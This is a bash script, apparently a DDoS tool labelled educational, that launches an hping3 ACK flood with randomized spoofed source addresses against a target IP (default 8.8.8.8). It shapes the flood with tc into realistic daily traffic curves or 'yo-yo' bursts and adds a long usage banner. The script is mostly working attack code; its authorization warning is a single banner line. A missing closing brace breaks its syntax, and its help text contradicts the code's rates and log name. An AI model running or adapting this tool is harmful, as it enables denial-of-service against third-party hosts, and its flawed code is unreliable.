#!/bin/bash

# =================================================================
#             ACK FLOOD FOR EDUCATIONAL PURPOSE
# =================================================================

# Default parameters
TARGET_IP="${1:-8.8.8.8}"
INTERFACE="${2:-eth0}"
DURATION="${3:-300}"
TIME_COMPRESSION="${4:-288}"                        
LOG_FILE="hping3_ack_flood_$(date +%Y%m%d_%H%M%S).log"
VERBOSE=true

# TC QDISC config
PACKET_SIZE=60        # bytes
BURST_SIZE="64k"      # bits
LATENCY="200ms"
MIN_RATE="1kbit"
MAX_RATE="1gbit"

# PID và flags
HPING_PID=""
TC_ACTIVE=false
PYTHON_AVAILABLE=false

# Dependencies check
check_dependencies() {
    local missing_deps=()
    
    if ! command -v hping3 &> /dev/null; then        # check hping3
        missing_deps+=("hping3")
    fi
    
    if ! command -v bc &> /dev/null; then            # check bc
        missing_deps+=("bc")
    fi
    
    if ! command -v tc &> /dev/null; then            # check iproute2 or tc
        missing_deps+=("iproute2")
    fi
    
    if [[ $EUID -ne 0 ]]; then                       # check root
        log "ERROR: Root privileges required"
        exit 1
    fi
    
    if [ ${#missing_deps[@]} -gt 0 ]; then           # print out all missing dependencies
        log "ERROR: Missing dependencies: ${missing_deps[*]}"
        exit 1
    fi
    
    if ! ip link show "$INTERFACE" &>/dev/null; then        # check NIC name
        log "ERROR: Interface $INTERFACE does not exist"
        exit 1
    fi
}

# Check Python availability
check_python() {
    if command -v python3 &> /dev/null; then
        # Check python3 math libraries
        if python3 -c "import math; print('Python math OK')" &>/dev/null; then
            PYTHON_AVAILABLE=true
            log "Python3 with math module: Available"
            return 0
        fi
    fi
        # Check python math libraries when user do not have python3
    if command -v python &> /dev/null; then
        if python -c "import math; print('Python math OK')" &>/dev/null; then
            PYTHON_AVAILABLE=true
            log "Python with math module: Available"
            return 0
        fi
    fi
    
    log "WARNING: Python not available, falling back to simplified math"
    PYTHON_AVAILABLE=false
    return 1
}

# Logging Function
log() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $message" | tee -a "$LOG_FILE"
}

# Cleanup Function - Clean all process
cleanup() {
    log "=== CLEANUP STARTED ==="
    
    if [ -n "$HPING_PID" ] && kill -0 "$HPING_PID" 2>/dev/null; then
        log "Killing hping3 process (PID: $HPING_PID)"
        kill -TERM "$HPING_PID"
        sleep 2
        if kill -0 "$HPING_PID" 2>/dev/null; then
            kill -KILL "$HPING_PID"
        fi
        wait "$HPING_PID" 2>/dev/null
    fi
    
    if [ "$TC_ACTIVE" = true ]; then
        log "Removing tc qdisc from interface $INTERFACE"
        tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
        TC_ACTIVE=false
    fi
    
    log "=== CLEANUP COMPLETED ==="
    exit 0
}

trap cleanup EXIT INT TERM

# Python script for calculating traffic patterns
create_python_calculator() {
    cat << 'PYTHON_SCRIPT' > /tmp/traffic_calculator.py
#!/usr/bin/env python3
import math
import sys

def calculate_hourly_rate(hour, scale_factor=100):
    """
    Calculate traffic rate hourly with peak patterns
    """
    # Morning peak (9 AM) - Gaussian distribution
    morning_peak = 25 * math.exp(-((hour - 9) ** 2) / 6.25)
    
    # Evening peak (8 PM) - Gaussian distribution  
    evening_peak = 45 * math.exp(-((hour - 20) ** 2) / 7.84)
    
    # Night drop (2:30 AM) - Negative Gaussian
    night_drop = -15 * math.exp(-((hour - 2.5) ** 2) / 3.24)
    
    # Daily sine wave cycle
    daily_cycle = 5 * math.sin(math.pi * hour / 12 - math.pi/2)
    
    # Base traffic level
    base_level = 20
    
    # Combine all factors
    traffic_factor = base_level + morning_peak + evening_peak + night_drop + daily_cycle
    
    # Calculate PPS with minimum threshold
    pps = max(300, traffic_factor * scale_factor)
    
    return int(pps)

def calculate_weekly_multiplier(day_of_week):
    """
    Calculate the multiplier factor by day of the week
    """
    base = 87
    
    # Weekly sine pattern
    sine_component = 8 * math.sin(2 * math.pi * day_of_week / 7 + math.pi/7)
    
    # Weekend spike (Saturday = day 6)
    weekend_spike = 5 * math.exp(-((day_of_week - 6) ** 2) / 2.25)
    
    # Combine factors
    weekly_factor = (base + sine_component + weekend_spike) / base
    
    return weekly_factor

def calculate_minute_factor(minute_in_hour):
    """
    Calculate the minute-by-minute variation within an hour
    """
    return 1 + 0.3 * math.sin(2 * math.pi * minute_in_hour / 60)

def get_compressed_time(elapsed_seconds, compression_factor):
    """
    Calculating virtual time with compression factor
    """
    virtual_hours = elapsed_seconds * compression_factor / 3600
    current_hour = int(virtual_hours % 24)
    
    virtual_days = virtual_hours / 24
    day_of_week = int(virtual_days % 7) + 1
    
    seconds_in_hour = (elapsed_seconds * compression_factor) % 3600
    minute_in_hour = int(seconds_in_hour / 60)
    
    return current_hour, day_of_week, minute_in_hour

def calculate_traffic_rate(elapsed_seconds, compression_factor, noise_factor=0.15):
    """
    Total traffic rate with multiple factors
    """
    # Get virtual time components
    hour, day, minute = get_compressed_time(elapsed_seconds, compression_factor)
    
    # Calculate base rates
    hourly_rate = calculate_hourly_rate(hour)
    weekly_multiplier = calculate_weekly_multiplier(day)
    minute_factor = calculate_minute_factor(minute)
    
    # Combine all factors
    base_rate = hourly_rate * weekly_multiplier * minute_factor
    
    # Add random noise
    import random
    noise = random.uniform(-noise_factor, noise_factor)
    final_rate = base_rate * (1 + noise)
    
    return max(1, int(final_rate)), hour, day, minute

def calculate_yoyo_rate(elapsed_seconds, cycle_duration=20, yoyo_type="square"):
    """
    Calculating pattern rates
    """
    cycle_position = (elapsed_seconds % cycle_duration) / cycle_duration
    
    if yoyo_type == "square":
        return 5000 if cycle_position < 0.5 else 500
    elif yoyo_type == "sawtooth":
        if cycle_position < 0.8:
            return int(1000 + 9000 * cycle_position / 0.8)
        else:
            return 1000
    elif yoyo_type == "burst":
        if cycle_position < 0.2:
            return 10000
        elif cycle_position < 0.4:
            return 4000
        else:
            return 2000
    else:
        return 5000

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 traffic_calculator.py <mode> <elapsed_seconds> [compression_factor] [yoyo_type]")
        sys.exit(1)
    
    mode = sys.argv[1]
    elapsed_seconds = float(sys.argv[2])
    
    if mode == "compressed":
        compression_factor = float(sys.argv[3]) if len(sys.argv) > 3 else 72
        rate, hour, day, minute = calculate_traffic_rate(elapsed_seconds, compression_factor)
        print(f"{rate} {hour} {day} {minute}")
    
    elif mode == "yoyo":
        yoyo_type = sys.argv[3] if len(sys.argv) > 3 else "square"
        rate = calculate_yoyo_rate(elapsed_seconds, yoyo_type=yoyo_type)
        cycle_pos = (elapsed_seconds % 20) / 20
        print(f"{rate} {cycle_pos:.2f}")
    
    else:
        print("Unknown mode")
        sys.exit(1)
PYTHON_SCRIPT
    
    chmod +x /tmp/traffic_calculator.py
}

# Fallback math functions for when Python is not available
calculate_simple_rate() {
    local hour=$1
    local day=$2
    local minute=$3
    
    # Simplified pattern using only bc capabilities
    local base_rate=5000
    
    # Simple hour-based variation
    if [ $hour -ge 8 ] && [ $hour -le 10 ]; then
        base_rate=8000  # Morning peak
    elif [ $hour -ge 19 ] && [ $hour -le 21 ]; then
        base_rate=12000  # Evening peak
    elif [ $hour -ge 1 ] && [ $hour -le 5 ]; then
        base_rate=2000   # Night low
    fi
    
    # Weekend multiplier
    if [ $day -eq 6 ] || [ $day -eq 7 ]; then
        base_rate=$(echo "scale=0; $base_rate * 1.3 / 1" | bc -l)
    fi
    
    # Add some variation based on minute
    local minute_var=$(echo "scale=0; $minute % 10" | bc -l)
    local variation=$(echo "scale=0; $base_rate * $minute_var / 100" | bc -l)
    
    local final_rate=$(echo "scale=0; $base_rate + $variation" | bc -l)
    echo "$final_rate"
}

# Convert PPS to bandwidth
pps_to_bandwidth() {
    local pps=$1
    local bps=$(echo "scale=0; $pps * $PACKET_SIZE * 8" | bc -l)
    
    local min_bps=1000
    if [ $(echo "$bps < $min_bps" | bc -l) -eq 1 ]; then
        bps=$min_bps
    fi
    
    if [ $(echo "$bps >= 1000000000" | bc -l) -eq 1 ]; then
        local gbps=$(echo "scale=2; $bps / 1000000000" | bc -l)
        echo "${gbps}gbit"
    elif [ $(echo "$bps >= 1000000" | bc -l) -eq 1 ]; then
        local mbps=$(echo "scale=2; $bps / 1000000" | bc -l)
        echo "${mbps}mbit"
    elif [ $(echo "$bps >= 1000" | bc -l) -eq 1 ]; then
        local kbps=$(echo "scale=0; $bps / 1000" | bc -l)
        echo "${kbps}kbit"
    else
        echo "1kbit"
    fi
}

# TC qdisc init functions
init_tc_qdisc() {
    log "Initializing TC qdisc on interface $INTERFACE"
    tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
    
    if tc qdisc add dev "$INTERFACE" root tbf rate "$MIN_RATE" burst "$BURST_SIZE" latency "$LATENCY"; then
        TC_ACTIVE=true
        log "TC qdisc initialized successfully"
        return 0
    else
        log "ERROR: Failed to initialize TC qdisc"
        return 1
    fi
}

# UPdate tc rate
update_tc_rate() {
    local new_rate="$1"
    
    if [ "$TC_ACTIVE" = true ]; then
        if tc qdisc change dev "$INTERFACE" root tbf rate "$new_rate" burst "$BURST_SIZE" latency "$LATENCY" 2>/dev/null; then
            return 0
        else
            log "WARNING: Failed to update TC rate to $new_rate, reinitializing..."
            tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
            if tc qdisc add dev "$INTERFACE" root tbf rate "$new_rate" burst "$BURST_SIZE" latency "$LATENCY"; then
                return 0
            else
                log "ERROR: Failed to reinitialize TC qdisc"
                TC_ACTIVE=false
                return 1
            fi
        fi
    else
        return 1
    fi
}

# Init hping3 in background
start_hping3_flood() {
    log "Starting hping3 flood to $TARGET_IP"
    
    hping3 \
        -A \
        --flood \
        --rand-source \
        -p 80 \
        --interface "$INTERFACE" \
        "$TARGET_IP" \
        >> "$LOG_FILE" 2>&1 &
    
    HPING_PID=$!
    
    if [ -n "$HPING_PID" ] && kill -0 "$HPING_PID" 2>/dev/null; then
        log "hping3 started successfully (PID: $HPING_PID)"
        return 0
    else
        log "ERROR: Failed to start hping3"
        return 1
    fi
}

# Main pattern generation với Python support
generate_compressed_pattern_python() {
    local duration_seconds=$1
    
    log "=== PYTHON-ENHANCED TC QDISC SIMULATION ==="
    log "Math Engine: Python3 with accurate mathematical functions"
    log "Compression factor: ${TIME_COMPRESSION}x"
    log "Real duration: ${duration_seconds}s = Virtual: $(python3 -c "print(f'{$duration_seconds * $TIME_COMPRESSION / 3600:.1f}')")h"
    
    if ! init_tc_qdisc; then
        log "ERROR: Cannot initialize TC qdisc"
        return 1
    fi
    
    if ! start_hping3_flood; then
        log "ERROR: Cannot start hping3 flood"
        return 1
    fi
    
    local update_interval=3
    local current_time=0
    local last_rate=""
    
    while [ $current_time -lt $duration_seconds ]; do
        local python_output
        if python_output=$(python3 /tmp/traffic_calculator.py compressed $current_time $TIME_COMPRESSION 2>/dev/null); then
            # Parse Python output: "rate hour day minute"
            local final_pps=$(echo "$python_output" | awk '{print $1}')
            local virtual_hour=$(echo "$python_output" | awk '{print $2}')
            local virtual_day=$(echo "$python_output" | awk '{print $3}')
            local virtual_minute=$(echo "$python_output" | awk '{print $4}')
            
            local bandwidth=$(pps_to_bandwidth "$final_pps")
            
            if [ "$bandwidth" != "$last_rate" ]; then
                if update_tc_rate "$bandwidth"; then
                    log "T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" $virtual_minute) | PPS: ${final_pps} | BW: ${bandwidth} [PYTHON]"
                    last_rate="$bandwidth"
                else
                    log "T+${current_time}s | ERROR: Failed to update TC rate to $bandwidth"
                fi
            elif [ "$VERBOSE" = true ]; then
                log "T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" $virtual_minute) | PPS: ${final_pps} | BW: ${bandwidth} [unchanged]"
            fi
        else
            log "T+${current_time}s | ERROR: Python calculation failed, using fallback"
            # Fallback to simple calculation
            local hour=$(echo "scale=0; ($current_time * $TIME_COMPRESSION / 3600) % 24" | bc -l)
            local day=$(echo "scale=0; ($current_time * $TIME_COMPRESSION / 86400) % 7 + 1" | bc -l)
            local minute=$(echo "scale=0; ($current_time * $TIME_COMPRESSION % 3600) / 60" | bc -l)
            
            local simple_rate=$(calculate_simple_rate $hour $day $minute)
            local bandwidth=$(pps_to_bandwidth "$simple_rate")
            
            update_tc_rate "$bandwidth"
            log "T+${current_time}s | Virtual: Day${day} ${hour}:$(printf "%02d" $minute) | PPS: ${simple_rate} | BW: ${bandwidth} [FALLBACK]"
        fi
        
        sleep $update_interval
        current_time=$((current_time + update_interval))
    done
}

# Yo-yo pattern with Python
generate_yoyo_pattern_python() {
    local duration_seconds=$1
    local yoyo_type="${2:-square}"
    
    log "=== PYTHON-ENHANCED YO-YO PATTERN ==="
    log "Type: $yoyo_type | Duration: ${duration_seconds}s"
    
    if ! init_tc_qdisc; then
        log "ERROR: Cannot initialize TC qdisc"
        return 1
    fi
    
    if ! start_hping3_flood; then
        log "ERROR: Cannot start hping3 flood"
        return 1
    fi
    
    local update_interval=2
    local current_time=0
    
    while [ $current_time -lt $duration_seconds ]; do
        local python_output
        if python_output=$(python3 /tmp/traffic_calculator.py yoyo $current_time $yoyo_type 2>/dev/null); then
            local pps=$(echo "$python_output" | awk '{print $1}')
            local cycle_pos=$(echo "$python_output" | awk '{print $2}')
            
            local bandwidth=$(pps_to_bandwidth "$pps")
            
            if update_tc_rate "$bandwidth"; then
                log "T+${current_time}s | Cycle: ${cycle_pos} | PPS: ${pps} | BW: ${bandwidth} [$yoyo_type-PYTHON]"
            else
                log "T+${current_time}s | ERROR: Failed to update yo-yo rate to $bandwidth"
            fi
        else
            log "T+${current_time}s | ERROR: Python yo-yo calculation failed"
        fi
        
        sleep $update_interval
        current_time=$((current_time + update_interval))
    done


# Usage
show_usage() {
    cat << EOF
╔══════════════════════════════════════════════════════════════════════════════╗
║                    HPING3 TRAFFIC SIMULATOR WITH PYTHON                      ║
║                    Python-Enhanced Traffic Pattern Generator                 ║
╚══════════════════════════════════════════════════════════════════════════════╝

USAGE:
   $0 [TARGET_IP] [INTERFACE] [DURATION] [COMPRESSION] [MODE] [YOYO_TYPE]

PARAMETERS:
   TARGET_IP     : Target IP address (default: 8.8.8.8)
   INTERFACE     : Network interface (default: eth0)
   DURATION      : Test duration in seconds (default: 300)
   COMPRESSION   : Time compression factor (default: 288x)
   MODE          : Traffic pattern mode (see below)
   YOYO_TYPE     : Yo-yo pattern type (for python-yoyo mode only)

AVAILABLE MODES:
   python-compressed  - Compressed time simulation with Python math engine
                       ✓ Primary: Python mathematical functions (Gaussian, sine waves)
                       ✓ Fallback: Simple bash calculations if Python fails
                       ✓ Update interval: 3 seconds
                       
   python-yoyo       - Yo-yo pattern simulation with Python engine  
                       ✓ Python-only: Advanced mathematical yo-yo patterns
                       ✓ No fallback: Requires Python3 with math module
                       ✓ Update interval: 2 seconds (faster)

YOYO PATTERN TYPES (for python-yoyo mode):
   square      - Square wave pattern (High: 5000 PPS, Low: 500 PPS)
                 └─ 50% high traffic, 50% low traffic per cycle
                 
   sawtooth    - Gradual ramp up then sudden drop
                 └─ Linear increase 1000→10000 PPS (80%), then drop (20%)
                 
   burst       - Short bursts with cooldown periods
                 └─ Burst: 5000 PPS (20%), Cooldown: 2500 PPS (40%), Idle: 1000 PPS (40%)

ARCHITECTURE OVERVIEW:
   ┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
   │  Python Engine  │───▶│  Traffic Pattern │───▶ │   TC Qdisc      │
   │  (Primary)      │     │   Calculation    │     │  (Bandwidth     │
   │                 │     │                  │     │   Control)      │
   │  Bash Fallback  │───▶│                   │    │                 │
   │  (Backup)*      │     │                  │     │                 │
   └─────────────────┘     └──────────────────┘     └─────────────────┘
   
   * Fallback chỉ available cho python-compressed mode

PYTHON INTEGRATION FEATURES:
   ✓ Mathematical precision with exp(), sin(), cos() functions
   ✓ Gaussian curves for realistic morning/evening peaks
   ✓ Sine wave daily cycles and weekly variations  
   ✓ Complex multi-factor traffic modeling
   ✓ Automatic fallback to bash arithmetic when Python unavailable
   ✓ Real-time Python script generation (/tmp/traffic_calculator.py)

EXAMPLES - CHANGE EXAMPLE IP TO TARGET IP:
   # Basic compressed time simulation (1 week compressed to ~4 minutes)
   # Uses Python math engine with fallback support
   $0 192.168.1.100 eth0 300 72 python-compressed
   
   # Square wave yo-yo pattern for 3 minutes (Python-only)
   # High/Low alternating every 10 seconds
   $0 8.8.8.8 eth0 180 1 python-yoyo square
   
   # Sawtooth pattern with custom compression
   # Gradual ramp up then sudden drop pattern  
   $0 10.0.0.1 wlan0 600 36 python-yoyo sawtooth
   
   # Burst pattern for stress testing
   # Short high bursts with long idle periods
   $0 192.168.1.1 eth1 120 1 python-yoyo burst
   
   # Long compressed simulation (2 weeks in 10 minutes)
   $0 203.0.113.1 eth0 600 144 python-compressed

SYSTEM REQUIREMENTS:
   REQUIRED:
   - Root privileges (sudo)
   - hping3 package
   - iproute2 package (tc command)
   - bc calculator
   
   RECOMMENDED (for full functionality):
   - Python3 with math module
     └─ Without Python: compressed mode uses simple fallback
     └─ Without Python: yo-yo mode will fail
   
   NETWORK:
   - Valid network interface
   - Target should be reachable (optional)
   - Sufficient bandwidth for traffic generation

EXECUTION FLOW:
   1. Check dependencies (hping3, tc, bc, root)
   2. Check Python availability (python3 + math module)  
   3. Create Python calculator script (if Python available)
   4. Initialize TC qdisc (Token Bucket Filter)
   5. Start hping3 ACK flood (background process)
   6. Main loop:
      - Calculate traffic rate (Python primary, bash fallback)
      - Convert PPS to bandwidth  
      - Update TC qdisc rate
      - Sleep and repeat
   7. Cleanup on exit (kill hping3, remove qdisc, cleanup temp files)

TRAFFIC PATTERNS EXPLAINED:
   
   COMPRESSED MODE:
   - Simulates realistic daily/weekly traffic patterns
   - Morning peak (~9 AM): Gaussian curve with moderate traffic
   - Evening peak (~8 PM): Gaussian curve with higher traffic  
   - Night dip (~2:30 AM): Reduced traffic period
   - Weekend spike: Increased traffic on weekends
   - Continuous variation: Minute-by-minute fluctuations
   
   YOYO MODES:
   - Square: Abrupt high/low transitions for load balancer testing
   - Sawtooth: Gradual scaling up for auto-scaling tests
   - Burst: Short intensive periods for buffer overflow tests

IMPORTANT WARNINGS:
   - This tool generates significant network traffic
   - Use only on test networks or with proper authorization
   - Monitor system resources during execution
   - Ensure target systems can handle the traffic load
   - Stop immediately if network performance degrades

MONITORING & LOGS:
   - All activity logged to: hping3_traffic_python_YYYYMMDD_HHMMSS.log
   - Real-time status: [PYTHON] for math engine, [FALLBACK] for bash
   - TC qdisc changes logged with timestamps
   - Virtual time tracking for compressed mode
   - Pattern cycle tracking for yo-yo mode

TROUBLESHOOTING:
   - "Python not available" → Install python3 or use fallback  
   - "TC qdisc failed" → Check interface name and permissions
   - "hping3 failed" → Install hping3 package
   - "Target unreachable" → Check network connectivity (warning only)

HELP & SUPPORT:
   Run with: $0 -h, $0 --help, or $0 help
   Check logs for detailed execution information
   
VERSION INFO:
   Python-Enhanced Traffic Simulator v2.0
   Unified Architecture with Intelligent Fallback
   
EOF
}

# Main function
main() {
    local mode="${5:-python-compressed}"
    local yoyo_type="${6:-square}"
    
    log "=== PYTHON-ENHANCED HPING3 TRAFFIC SIMULATOR ==="
    log "Target: $TARGET_IP"
    log "Interface: $INTERFACE" 
    log "Duration: ${DURATION}s"
    log "Compression: ${TIME_COMPRESSION}x"
    log "Mode: $mode"
    
    check_dependencies
    check_python
    
    # Create Python calculator
    if [ "$PYTHON_AVAILABLE" = true ]; then
        create_python_calculator
        log "Python math calculator created successfully"
    else
        log "Using simplified math fallback"
    fi
    
    # Test connectivity
    if ! ping -c 1 -W 2 "$TARGET_IP" &>/dev/null; then
        log "WARNING: Target $TARGET_IP may not be reachable"
    fi
    
    case "$mode" in
        "python-compressed")
            if [ "$PYTHON_AVAILABLE" = true ]; then
                generate_compressed_pattern_python "$DURATION"
            else
                log "Python not available, falling back to tc-compressed mode"
                # Would need to implement tc-compressed fallback here
            fi
            ;;
        "python-yoyo")
            if [ "$PYTHON_AVAILABLE" = true ]; then
                generate_yoyo_pattern_python "$DURATION" "$yoyo_type"
            else
                log "Python not available, cannot run python-yoyo mode"
                exit 1
            fi
            ;;
        *)
            log "ERROR: Unknown mode: $mode"
            log "Available modes: python-compressed, python-yoyo"
            show_usage
            exit 1
            ;;
    esac
    
    # Cleanup Python temp file
    rm -f /tmp/traffic_calculator.py
    
    log "=== SIMULATION COMPLETED ==="
    log "Log file: $LOG_FILE"
}

# Command line handling
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    show_usage
    exit 0
fi

main "$@"
